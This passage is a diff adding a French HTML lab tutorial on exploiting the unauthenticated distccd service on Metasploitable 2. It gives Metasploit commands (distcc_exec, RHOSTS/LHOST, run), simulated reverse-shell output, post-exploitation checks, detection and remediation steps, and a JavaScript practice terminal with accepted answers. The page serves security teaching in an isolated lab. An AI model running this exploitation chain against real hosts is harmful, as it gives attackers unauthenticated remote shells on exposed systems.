+            <span class="k">piège</span><span class="v">Ne pas confondre avec les backdoors vsftpd/UnrealIRCd qui donnaient directement root. Ici, l'accès est réel mais limité : une étape d'élévation de privilèges sera nécessaire pour aller plus loin.</span>
+            <span class="k">à retenir</span><span class="v">Le niveau d'accès obtenu dépend toujours du compte sous lequel tournait le service compromis. C'est pour ça qu'on ne fait jamais tourner un service en root sans raison.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">5</div>
+          <h3>Post-exploitation — exploration avec les droits daemon</h3>
+          <p class="step-sub">Avec un shell utilisateur limité, on explore ce qui est accessible.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>shell</div>
+            <pre><span class="prompt">$</span> id<button class="copy-btn" type="button" data-copy="id" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span>
+<span class="prompt">$</span> pwd<button class="copy-btn" type="button" data-copy="pwd" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">/</span>
+<span class="prompt">$</span> ls<button class="copy-btn" type="button" data-copy="ls" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">uid=1</span><span class="v">UID 1 correspond à l'utilisateur <strong>daemon</strong> — un compte système sans privilèges particuliers.</span>
+            <span class="k">pwd → /</span><span class="v">Le compte daemon n'a pas de répertoire personnel dédié : son répertoire courant est la racine <strong>/</strong>.</span>
+            <span class="k">ls</span><span class="v">Le listing affiché est celui de la racine réelle du système — cohérent avec <strong>pwd /</strong>. On y voit les répertoires classiques d'une distribution Linux.</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">6</div>
+          <h3>Sortie propre</h3>
+          <p class="step-sub">Fermer la session une fois les informations récupérées.</p>
+          <div class="term">
+            <div class="term-bar"><span class="dot"></span>shell</div>
+            <pre><span class="prompt">$</span> exit<button class="copy-btn" type="button" data-copy="exit" aria-label="Copier la commande" title="Copier">⧉</button>
+<span class="out">logout</span></pre>
+          </div>
+          <div class="explain">
+            <span class="k">exit</span><span class="v">Ferme le shell et met fin à la session distcc. La commande fonctionne dès le début du mode libre.</span>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <section id="cheatsheet">
+      <h2 class="section-title">Commandes à retenir</h2>
+      <p class="section-intro">Le strict nécessaire, groupé par phase — le reste peut se retrouver avec <span style="font-family:var(--mono); color:var(--text);">--help</span>.</p>
+
+      <div class="cheat-group">
+        <h4>reconnaissance</h4>
+        <table class="cheat">
+          <tr><td class="cmd">nmap -sV -p 3632 IP</td><td class="desc">détecter distccd et sa version sur le port dédié</td></tr>
+          <tr><td class="cmd">nmap -sV -p 3632 --script distcc-cve2004-2687 IP</td><td class="desc">script NSE de détection de vulnérabilité (si disponible)</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>exploitation</h4>
+        <table class="cheat">
+          <tr><td class="cmd">use exploit/unix/misc/distcc_exec</td><td class="desc">charger le module Metasploit dédié</td></tr>
+          <tr><td class="cmd">set RHOSTS IP</td><td class="desc">définir la cible</td></tr>
+          <tr><td class="cmd">set LHOST IP</td><td class="desc">définir ton IP pour le reverse shell (si nécessaire)</td></tr>
+          <tr><td class="cmd">run</td><td class="desc">lancer l'exploit</td></tr>
+        </table>
+      </div>
+
+      <div class="cheat-group">
+        <h4>post-exploitation</h4>
+        <table class="cheat">
+          <tr><td class="cmd">whoami</td><td class="desc">identité de l'utilisateur (doit être daemon)</td></tr>
+          <tr><td class="cmd">id</td><td class="desc">UID, GID et groupes</td></tr>
+          <tr><td class="cmd">pwd</td><td class="desc">répertoire courant (doit être /)</td></tr>
+          <tr><td class="cmd">ls</td><td class="desc">contenu du répertoire courant (racine du système)</td></tr>
+          <tr><td class="cmd">uname -a</td><td class="desc">version du noyau et architecture</td></tr>
+          <tr><td class="cmd">hostname</td><td class="desc">nom de la machine (metasploitable)</td></tr>
+          <tr><td class="cmd">exit</td><td class="desc">fermer la session</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <section id="concepts">
+      <h2 class="section-title">Ce qu'il faut vraiment comprendre</h2>
+      <div class="concepts">
+        <div class="concept">
+          <h4>Fonctionnalité légitime mal exposée ≠ backdoor</h4>
+          <p>vsftpd et UnrealIRCd avaient du code malveillant injecté dans leurs archives officielles. distccd, lui, est un logiciel parfaitement légitime de compilation distribuée. Sa faille n'est pas dans son code mais dans sa configuration par défaut : accepter des requêtes de n'importe qui, sans restriction d'adresse source ni authentification. La leçon est différente : auditer le code ne suffit pas, il faut auditer la configuration et l'exposition réseau.</p>
+        </div>
+        <div class="concept">
+          <h4>Ce que « compilation distribuée sans authentification » signifie</h4>
+          <p>distcc permet d'envoyer des tâches de compilation à un serveur distant pour accélérer les builds. Sans authentification, n'importe qui sur le réseau peut soumettre une « compilation » qui n'est autre qu'une commande arbitraire. Le service l'exécutera avec ses propres privilèges. C'est l'équivalent d'un shell distant, mais avec les droits du service.</p>
+        </div>
+        <div class="concept">
+          <h4>daemon n'est pas root — et pourquoi c'est important</h4>
+          <p>Le shell obtenu s'exécute avec les privilèges de l'utilisateur <strong>daemon</strong> (UID 1), pas root. C'est une différence fondamentale avec les backdoors précédentes. Un accès utilisateur limité signifie qu'une étape d'élévation de privilèges sera nécessaire pour compromettre complètement la machine — un futur cours de la roadmap couvrira cette phase.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="anatomie">
+      <h2 class="section-title">Anatomie — contraste avec les backdoors</h2>
+      <p class="section-intro">Pour bien comprendre la différence entre une backdoor injectée et une fonctionnalité légitime mal exposée.</p>
+
+      <div class="concepts">
+        <div class="concept">
+          <h4>Pas de code malveillant, pas de tarball piégé</h4>
+          <p>Contrairement à vsftpd 2.3.4 (archive piégée en 2011) ou UnrealIRCd (archive piégée en 2010), distccd n'a subi aucune altération malveillante. C'est un outil de compilation distribuée développé et maintenu normalement. Le code source est celui d'origine.</p>
+        </div>
+        <div class="concept">
+          <h4>La configuration par défaut comme vecteur</h4>
+          <p>distccd, dans sa configuration par défaut sur Metasploitable 2, écoute sur toutes les interfaces (0.0.0.0) sans aucune restriction d'accès. Il accepte les requêtes de compilation de n'importe quelle machine. Cette souplesse est pratique en développement sur un réseau de confiance, mais elle devient une vulnérabilité majeure dès que le service est exposé plus largement.</p>
+          <div class="term" style="margin-top:14px;">
+            <div class="term-bar"><span class="dot"></span>analogie pédagogique — pas le code exact</div>
+            <pre style="color:var(--muted);">// Principe : le service reçoit une "tâche de compilation"
+// qui contient en réalité une commande arbitraire.
+<span class="out">// distccd exécute la commande avec ses propres privilèges (daemon).</span>
+<span class="out">// Résultat : un shell distant, sans authentification préalable.</span></pre>
+          </div>
+        </div>
+        <div class="concept">
+          <h4>Pourquoi ça change la méthode de sécurisation</h4>
+          <p>Pour une backdoor, la remédiation consiste à vérifier l'intégrité du binaire (hash, signature). Pour une fonctionnalité mal exposée comme distccd, la remédiation est radicalement différente : restreindre l'accès réseau (pare-feu, localhost uniquement, réseau de confiance), exiger une authentification ou un tunnel, ou simplement désactiver le service s'il n'est pas utilisé. La leçon : la surface d'attaque ne se limite pas aux bugs logiciels, elle inclut toute fonctionnalité exposée sans contrôle d'accès.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="detection">
+      <h2 class="section-title">Détection &amp; remédiation</h2>
+      <p class="section-intro">Le point de vue du défenseur : comment repérer distccd exposé et comment limiter les risques.</p>
+
+      <div class="cheat-group">
+        <table class="cheat">
+          <tr><td class="cmd">ss -tulpn | grep 3632</td><td class="desc">vérifier si distccd écoute et sur quelle interface (0.0.0.0 = toutes, à restreindre)</td></tr>
+          <tr><td class="cmd">iptables -A INPUT -p tcp --dport 3632 -s 127.0.0.1 -j ACCEPT && iptables -A INPUT -p tcp --dport 3632 -j DROP</td><td class="desc">restreindre l'accès à localhost uniquement</td></tr>
+          <tr><td class="cmd">/etc/default/distcc</td><td class="desc">configuration : définir `--allow` avec les adresses IP autorisées, ou `--listen 127.0.0.1`</td></tr>
+          <tr><td class="cmd">systemctl stop distccd && systemctl disable distccd</td><td class="desc">désactiver le service s'il n'est pas utilisé — la remédiation la plus simple</td></tr>
+          <tr><td class="cmd">ssh -L 3632:localhost:3632 user@serveur</td><td class="desc">si le service est nécessaire, le tunneliser via SSH pour exiger une authentification</td></tr>
+        </table>
+      </div>
+    </section>
+
+    <section id="practice">
+      <h2 class="section-title">Terminal d'entraînement</h2>
+      <p class="section-intro">Rejoue la chaîne d'exploitation toi-même — y compris la partie qu'on saute trop vite d'habitude : <strong style="color:var(--text)">vérifier le niveau d'accès réellement obtenu</strong>. Le scan renvoie tout, à toi de chercher. Les indices donnent la logique, jamais la commande telle quelle.</p>
+
+      <div class="term-launch">
+        <button class="term-launch-btn" id="term-open-btn" type="button">
+          <span class="term-launch-dot"></span>
+          Ouvrir le terminal
+        </button>
+        <p class="term-launch-sub">Plein écran · indices logiques, pas de commande donnée · historique ↑ / ↓ comme un vrai shell</p>
+      </div>
+    </section>
+
+    <footer>
+      <div class="note">
+        <span class="ok">✓</span> lab isolé — réseau interne VirtualBox, aucune machine réelle ni connexion externe impliquée.
+      </div>
+    </footer>
+  </div>
+
+  <div class="term-fullscreen" id="term-fullscreen">
+    <div class="term-fs-header">
+      <div class="term-fs-headrow">
+        <div class="term-fs-titlebar">
+          <span class="term-fs-dot r"></span><span class="term-fs-dot y"></span><span class="term-fs-dot g"></span>
+          <span class="term-fs-context" id="sim-context">kali@kali</span>
+        </div>
+        <button class="term-fs-close" id="term-close-btn" type="button" aria-label="Fermer le terminal">✕</button>
+      </div>
+      <div class="term-fs-info">
+        <span class="item">Cible <strong id="ib-target">192.168.56.20</strong></span>
+        <span class="item">Attaquant <strong id="ib-attacker">192.168.56.10</strong></span>
+        <span class="item mode" id="sim-mode-label">reconnaissance</span>
+      </div>
+      <div class="term-progress">
+        <div class="term-progress-track"><div class="term-progress-fill" id="term-progress-fill"></div></div>
+        <span class="term-progress-label" id="sim-progress">étape 1/6</span>
+      </div>
+      <div class="term-fs-consigne" id="term-fs-consigne">
+        <span class="consigne-tag" id="consigne-tag">Consigne</span>
+        <span class="consigne-text" id="consigne-text">—</span>
+      </div>
+    </div>
+
+    <div class="sim-body" id="sim-body">
+      <div class="sim-line sim-inputline" id="sim-inputline">
+        <span class="p" id="sim-prompt-label">$</span>
+        <input id="sim-input" class="sim-input" type="text" placeholder="tape ta commande puis Entrée… (↑ ↓ pour l'historique)" autocomplete="off" spellcheck="false">
+      </div>
+    </div>
+
+    <div class="term-fs-footer">
+      <div class="analyze-popup" id="analyze-popup">
+        <span class="ap-tag" id="ap-tag">À analyser</span>
+        <p class="ap-question" id="ap-question">—</p>
+        <div class="ap-actions">
+          <button class="ap-btn ap-continue" id="ap-continue-btn" type="button">Continuer →</button>
+        </div>
+      </div>
+      <div class="sim-hint-box" id="sim-hint-box"></div>
+      <div class="sim-controls">
+        <button class="sim-btn" id="sim-hint-btn">💡 Indice</button>
+        <button class="sim-btn" id="sim-solution-btn">🔍 Solution</button>
+        <button class="sim-btn continue" id="sim-continue-btn" style="display:none;">Continuer →</button>
+        <button class="sim-btn continue" id="sim-connect-btn" style="display:none;">🔌 Connexion réseau</button>
+        <button class="sim-btn" id="sim-reset-btn">↺ Recommencer</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  // ---------- SÉQUENCE ----------
+  const steps = [
+    { kind:"type", context:"kali@kali", prompt:"$",
+      task:"Lance un scan ciblé sur le port 3632 pour identifier le service distccd et sa version",
+      accepted:["nmap -sv -p 3632 192.168.56.20"],
+      hint:"Il te faut l'outil de référence pour la reconnaissance réseau, en ciblant précisément le port par défaut de distccd (3632) et en activant la détection de version (-sV).",
+      output:[
+        {t:"PORT     STATE SERVICE VERSION", c:"o"},
+        {t:"3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))", c:"o", id:"hl-distcc-port"}
+      ] },
+
+    { kind:"analyze",
+      question:"distccd est un service de compilation distribuée. Contrairement à vsftpd ou UnrealIRCd, il n'a pas de code malveillant injecté. Que permet concrètement un tel service exposé sans authentification ?",
+      hint:"Pense à ce qu'un service de compilation accepte comme entrée : des tâches à exécuter. Sans contrôle d'accès, qui peut lui en envoyer ?",
+      highlightIds:["hl-distcc-port"],
+      annotation:"→ La faille est dans la configuration par défaut : distccd accepte n'importe quelle requête de compilation, sans authentification ni restriction réseau. N'importe qui peut lui faire exécuter des commandes arbitraires. Pas de backdoor — juste une fonctionnalité légitime mal exposée." },
+
+    { kind:"type", context:"kali@kali", prompt:"$",
+      task:"Lance Metasploit",
+      accepted:["msfconsole"],
+      hint:"Le module Metasploit pour distccd doit être chargé par le framework. Ce framework a une console interactive dédiée, qu'on démarre par une seule commande depuis Kali — c'est l'outil le plus connu du lab.",
+      output:[
+        {t:"Metasploit tip: You can pivot connections over sessions started with the ssh_login modules", c:"o"},
+        {t:"=[ metasploit v6.4.135-dev                               ]", c:"o"},
+        {t:"+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads  ]", c:"o"},
+        {t:"+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion   ]", c:"o"},
+        {t:"Metasploit Documentation: https://docs.metasploit.com/", c:"o"}
+      ] },
+
+    { kind:"type", context:"msf", prompt:">",
+      task:"Charge le module Metasploit dédié à distccd (exploit/unix/misc/distcc_exec)",
+      accepted:["use exploit/unix/misc/distcc_exec"],
+      hint:"Le module se trouve dans la catégorie unix/misc. Son nom est directement lié à distccd. Utilise la commande use suivie du chemin complet.",
+      output:[] },
+
+    { kind:"type", context:"msf exploit(distcc_exec)", prompt:">",
+      task:"Définis la cible (RHOSTS)",
+      accepted:["set rhosts 192.168.56.20"],
+      hint:"Comme toujours avec Metasploit, il faut indiquer la cible avant de lancer. La variable standard pour l'hôte distant est RHOSTS. Utilise la commande set.",
+      output:[{t:"RHOSTS => 192.168.56.20", c:"ok"}] },
+
+    { kind:"type", context:"msf exploit(distcc_exec)", prompt:">",
+      task:"Lance l'exploit",
+      accepted:["run", "exploit"],
+      hint:"Cible configurée — il ne manque plus qu'à lancer concrètement le module chargé.",
+      output:[
+        {t:"[*] Started reverse TCP handler on 192.168.56.10:4444", c:"o"},
+        {t:"[+] 192.168.56.20:3632 - Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:53583)", c:"ok", id:"hl-distcc-shell"}
+      ] },
+
+    { kind:"analyze",
+      question:"Un shell est ouvert. Quelle est la différence fondamentale avec les backdoors vsftpd et UnrealIRCd ? Quel niveau d'accès a réellement été obtenu ici ?",
+      hint:"Le service tournait sous quel compte utilisateur ? root ou un utilisateur de service ? Pense à ce que tu vas taper pour vérifier.",
+      highlightIds:["hl-distcc-shell"],
+      annotation:"→ Le shell s'exécute avec les privilèges du service (utilisateur daemon), pas root. Ce n'est pas une backdoor donnant directement root. L'accès est réel mais limité : une élévation de privilèges sera nécessaire pour aller plus loin (cours ultérieur de la roadmap)." },
+
+    { kind:"type", context:"daemon@metasploitable", prompt:"$",
+      task:"Vérifie l'identité de l'utilisateur dans ce shell",
+      accepted:["whoami"],
+      hint:"La commande la plus directe pour savoir sous quel compte tu tournes. Celle qu'on tape systématiquement après avoir obtenu un shell.",
+      output:[{t:"daemon", c:"ok"}] }
+  ];
+
+  // ---------- MODE LIBRE (après l'exploit) ----------
+  let freeContext = "daemon@metasploitable";
+  const freeCommands = {
+    "daemon@metasploitable": {
+      "whoami": [{t:"daemon", c:"ok"}],
+      "id": [{t:"uid=1(daemon) gid=1(daemon) groups=1(daemon)", c:"ok"}],
+      "pwd": [{t:"/", c:"o"}],
+      "ls": [{t:"bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  srv  sys  tmp  usr  var", c:"o"}],
+      "uname -a": [{t:"Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux", c:"o"}],
+      "hostname": [{t:"metasploitable", c:"o"}],
+      "exit": {t:"logout", c:"o"}
+    }
+  };
+</script>
+<script src="engine.js"></script>
+
+</body>
+</html>
